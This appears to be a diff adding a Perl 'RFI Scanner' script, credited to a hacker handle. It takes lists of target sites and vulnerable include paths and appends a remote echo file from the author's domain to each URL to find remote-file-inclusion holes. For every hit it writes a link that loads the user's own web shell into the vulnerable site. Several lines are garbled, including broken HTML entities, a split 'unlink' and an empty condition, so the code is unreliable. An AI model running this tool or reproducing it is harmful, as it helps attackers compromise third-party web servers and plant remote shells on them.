@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+####################################
+# c(o)de    by lizaib
+# X-ant Web Page: www.xhonker.com
+# mail:lizaib@gmail.com
+# RFI Scanner perl version v0.1
+#greatz ;
+#Darkcode,CyberGhost,excellance,redLine,RealWarrior,The_BeKi R,bolivar,Mardinli,RiceBoy,Metallicali...
+#and All my Friends...
+####################################
+use LWP::Simple;
+use LWP::UserAgent;
+my $OperatingSystem = $^O;
+my $unix = "";
+if (index(lc($OperatingSystem),"win")!=-1){
+$unix="0"; #windows system
+}else{
+$unix="1"; #unix system
+}
+if($unix){
+system("clear");
+}
+else{system("cls");}
+print q
+[ ; oooooooooooooooooooooooooooooooooooooooooooooooooo
+o o
+o ; RFI Scanner perl version 0.1 o
+o Coded By lizaib o
+ooooooooooooooooooooooooooooooooooooooooooooooooooo
+];
+
+print "Site List File:";
+$listsite=<STDIN>;
+chomp($listsite);
+if(!-e $listsite){
+print "$listsite doesn't exist";
+exit;
+}
+print "RFi List File:";
+$bugs=<STDIN>;
+chomp($bugs);
+if(!-e $bugs){
+print "$bugs doesn't exist";
+exit;
+}
+print "Enter Your Shell adress:";
+$shell=<STDIN>;
+chomp($shell);
+$xpl = LWP::UserAgent->new( ) or die;
+$res = $xpl->get($shell);
+if($res->is_success)
+{
+
+
+print "Scaning...";
+sleep(2);
+$rfidene="http://www.xhonker.com/echo.txt";
+unl ink("result.html");
+if(open(result,">>result.html")){
+print result "<body bgcolor=black><br><center><font color=#316262 face=tahoma size=4>EasyRfi Scanner Perl Version 0.1</font><br><font color=#316262 face=tahoma size=2><b>(C)oded by h4ckinger</font></b></center><hr>< ;br>";
+if(open (bug,$bugs)){
+while ($rfi=<bug>) {
+$rfi=~s/\n//;
+if(open (file,$listsite)){
+while ($teksite=<file>) {
+$teksite=~s/\n//;
+$page=get("$teksite$rfi$rfidene") ;
+if(open(result,">>result.html")){
+if($page=~/rfiisliyorbyh4ckinger/){
+print result "<font color=green face=tahoma size=1><b>[+]Found Rfi :&nbsp;&nbsp; </font><a href=$teksite$rfi$shell?><font color=#626262 face=tahoma size=1>$teksite$rfi$shell?</font></a></b&g t;<br>";
+}
+print result "<font color=brown face=tahoma size=1><b>[-]Not Found : &nbsp;&nbsp;</font><font color=#4F4F4F face=tahoma size=1> $teksite</font></b><br>" if(!);
+}else {print "File can't open";exit;}
+
+}
+}else {print "File can't open";exit;}
+}
+}
+else {print "File can't open";exit;}
+close result;
+close file;
+close bug;
+print "Rfi Logs created...\nYou can Look Result.html";
+system("start result.html");
+
+}else {print "File can't open";exit;}
+}else{print "Check your Shell adress.it's can't work"; exit;}
